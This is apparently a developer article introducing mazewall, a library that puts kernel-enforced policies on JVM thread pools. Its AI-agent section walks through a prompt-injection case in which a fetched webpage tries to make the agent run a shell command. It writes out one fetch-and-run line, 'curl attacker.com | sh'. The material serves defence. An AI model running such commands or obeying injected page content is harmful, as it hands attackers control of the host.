# Your Threads Are All Equally Trusted — Should They Be?

> **What this is:** A short, developer-first introduction to mazewall. No BPF bytecode. No kernel internals. Just the question every backend developer should be asking about their thread pools — and what you can actually do about it.
>
> **Before or after the series:** Read this before Part 1 if you want the "why bother?" answer first. Or read it after Part 4 if the attack walkthroughs made you wonder "but what do I actually change in my code?"

---

## The default you've never questioned

Picture a typical backend service. It handles three kinds of work:

- **HTTP handlers** — parse user input, query a database, return JSON
- **PDF generators** — read font files from disk, render documents
- **Email senders** — connect to an SMTP server, fire and forget

In most services these share a single thread pool — Spring's default task executor, a common `ForkJoinPool`, or whatever the framework hands out. The PDF generator doesn't import the email client. The HTTP handler doesn't call the PDF library. The separation exists in the code. But underneath, everything runs on the same shared pool.

But here's the question: does the OS know any of that?

No. From the Linux kernel's perspective, every thread in your JVM process is identical. The PDF generator thread, if compromised through a dependency vulnerability, has the exact same permission to open outbound network sockets as your email sender. Your HTTP handler thread could spawn a child process just as freely as if you'd deliberately written that code.

The architectural walls in your code exist logically. They don't exist physically.

---

## What "enforced" actually means

There are two ways to constrain what code can do:

**Software-level constraints** — your code simply doesn't call certain APIs. You trust that `PdfGeneratorService` won't open a socket because you wrote it that way. This is the default everywhere, and it's fine until a dependency has a bug, a library is compromised, or an attacker achieves code execution inside your JVM.

**Kernel-level constraints** — the OS itself refuses to carry out the operation. It doesn't matter what code is running or how it got there. The system call is intercepted before it reaches the kernel, and `EPERM` is returned. Full stop.

mazewall is about the second kind, applied directly to your thread pools, from inside your application, without external infrastructure.

---

## Two levels of enforcement

mazewall works in two tiers that stack on top of each other. Understanding the difference is the whole point of this article.

### Tier 1: Process-wide baseline

This is a rule that applies to your entire JVM process — every thread, every library, every future class that gets loaded.

You call it once, at startup:

```kotlin
// Called once at application startup, before accepting any traffic.
// After this line, no thread in this JVM can ever spawn a child process.
ContainedExecutors.installOnProcess(Policy.NO_EXEC)
```

After that call, `ProcessBuilder.start()`, `Runtime.exec()`, and any native equivalent are permanently and irrevocably blocked for the entire JVM lifetime. The kernel will refuse them with `EPERM`.

**When to use it:** For invariants that should be universally true. A backend service has no legitimate reason to spawn shell commands. Ever. Not the HTTP handler, not the GC thread, not a compromised library. Blocking `execve` process-wide costs nothing at runtime, and it turns the most common class of post-exploitation payload (spawn a reverse shell) into a dead end — regardless of which thread the attacker reaches.

### Tier 2: Thread-scoped profiles

This is a policy that applies only to threads inside a specific `ExecutorService`. Other threads in the JVM run completely unrestricted.

```kotlin
// This executor's threads can only do pure computation.
// No network. No filesystem writes. No subprocess spawning.
val pdfPool = ContainedExecutors.wrap(
    Executors.newFixedThreadPool(4),
    Policy.PURE_COMPUTE
)

// This executor's threads can connect outbound, but can't spawn processes.
val emailPool = ContainedExecutors.wrap(
    Executors.newSingleThreadExecutor(),
    Policy.NO_EXEC
)

// This executor's threads can read only from /app/templates — nowhere else.
val templatePool = ContainedExecutors.wrap(
    Executors.newSingleThreadExecutor(),
    Policy.builder()
        .allowFsRead("/app/templates")
        .build()
)
```

These policies are installed on each thread the first time it executes a task. The JVM's own coordination threads — the garbage collector, the JIT compiler, the class loader — are untouched and continue to run without restriction.

**When to use it:** When different parts of your application have meaningfully different access requirements. A PDF renderer has no business opening network connections. A data-processing worker has no business writing to arbitrary paths. Wrapping the executor makes your architectural intent into a physical enforcement boundary.

---

## A concrete scenario: the AI agent

The agent sandbox demo in this repository shows this pattern applied to a real problem. An LLM-based agent orchestrates three tools:

- **`fetchWebpage`** — makes outbound HTTP requests
- **`analyzeUserFile`** — reads files from a workspace directory
- **`executeDataAnalysis`** — runs shell scripts

Each tool runs in its own contained executor:

```kotlin
// Web tool: can make network calls, cannot spawn processes from untrusted call sites
val webExecutor = ContainedExecutors.wrap(webRawExecutor, networkPolicy, webScopingPolicy)

// File tool: can ONLY read from the workspace directory (Landlock enforcement)
val fileExecutor = ContainedExecutors.wrap(fileRawExecutor,
    Policy.builder()
        .allowFsRead(workspaceDir.absolutePath)
        .build()
)

// Analysis tool: CAN spawn processes, but only when called from executeDataAnalysis
val analysisExecutor = ContainedExecutors.wrap(analysisRawExecutor, execPolicy, execScopingPolicy)
```

Now consider what happens during a prompt injection attack — where malicious content in a fetched webpage tries to hijack the agent into running a shell command:

```kotlin
// Inside fetchWebpage(), a malicious instruction embedded in the page tries:
val process = ProcessBuilder("sh", "-c", "curl attacker.com | sh").start()
```

This runs on the `webExecutor` thread. That thread has `execve` blocked. The `ProcessBuilder` call throws `IOException`. The attack stops here. The file executor can't exfiltrate data over the network because `connect` is blocked on those threads. The analysis executor *can* run `execve`, but only from `executeDataAnalysis` — not from a hijacked web fetch.

No external firewall rule. No container reconfiguration. The policy is declared next to the code that needs it.

---

## What changes in your development workflow

More than the API surface suggests. If your service currently uses a single shared thread pool — which is the common default — adopting per-compartment policies means splitting it into dedicated pools: one for HTTP handling, one for document generation, one for outbound calls, and so on.

That is a genuine architectural change, not just a one-liner. It also has a real cost: more thread pools mean more OS threads and more context switches as work is dispatched across them. For I/O-heavy workloads this is usually negligible; for highly CPU-bound workloads at scale it is worth measuring.

Once the pools are separated, the wrapping step itself is straightforward:

**Before:**
```kotlin
val documentPool = Executors.newFixedThreadPool(8)
```

**After:**
```kotlin
val documentPool = ContainedExecutors.wrap(
    Executors.newFixedThreadPool(8),
    Policy.PURE_COMPUTE  // or Policy.NO_EXEC, or a custom policy
)
```

The `ExecutorService` interface is unchanged — `submit()`, `invokeAll()`, `Future` all work as before. The only difference is what the kernel will and won't allow those threads to do.

If you over-restrict and block something the code genuinely needs, you should see an `IOException` or `SecurityException` during testing — provided your test suite exercises the affected code paths. There is no catch-all safety net here; untested paths can still surface violations in production.

---

## The constraint you need to know

Thread-scoped policies alone are **not** a complete security boundary against an attacker who has achieved arbitrary code execution inside the JVM. Because JVM threads share the same heap and address space, a sophisticated exploit can potentially corrupt memory on an unrestricted thread to escape a thread-scoped sandbox.

This is why the two tiers are designed to stack:

- **Tier 1 (process-wide)** establishes the absolute backstop — things that no thread should ever do. This is the layer that remains meaningful even against memory corruption.
- **Tier 2 (thread-scoped)** reduces the blast radius — it limits what a compromised thread can do before the attacker attempts escalation.

Used together, a compromised thread that attempts to spawn a reverse shell is stopped at the process-wide layer. If it can't escalate, it's stuck within the narrow set of operations the thread pool was legitimately supposed to perform. In most real-world post-exploitation scenarios — Log4Shell-style RCE, XXE, SSRF — the attacker never gets the chance to attempt the more sophisticated escape.

---

## What this is not

mazewall is one layer in a stack, not a replacement for any other part of it:

- **Container security** (Docker/Podman Seccomp profiles, network policies, cgroup limits) — the outer wall. Still necessary.
- **[Kubescape](https://kubescape.io)** — cluster-wide eBPF observation and behavioral profile generation across all workloads.
- **[Tetragon](https://tetragon.io)** — kernel-level enforcement and real-time process observability using eBPF, operated at the node level.
- **Authentication, input validation, secrets management** — unrelated concerns that mazewall does not touch.

What mazewall adds is the one thing these layers cannot provide: enforcement that is aware of your application's internal thread structure. Kubescape and Tetragon see the JVM as a single black box. Docker applies one profile to every thread uniformly. mazewall lets you express different rules for different parts of the same process, enforced by the same kernel mechanisms — from inside the application, with no external agent required.

---

## Where to go next

**[Part 1: Do You Really Know What Your App Is Doing at Runtime?](article.md)** — The full case for behavioral security: why composition transparency (what's in the binary) is not the same as behavioral transparency (what the binary is doing right now), and where the industry is heading.
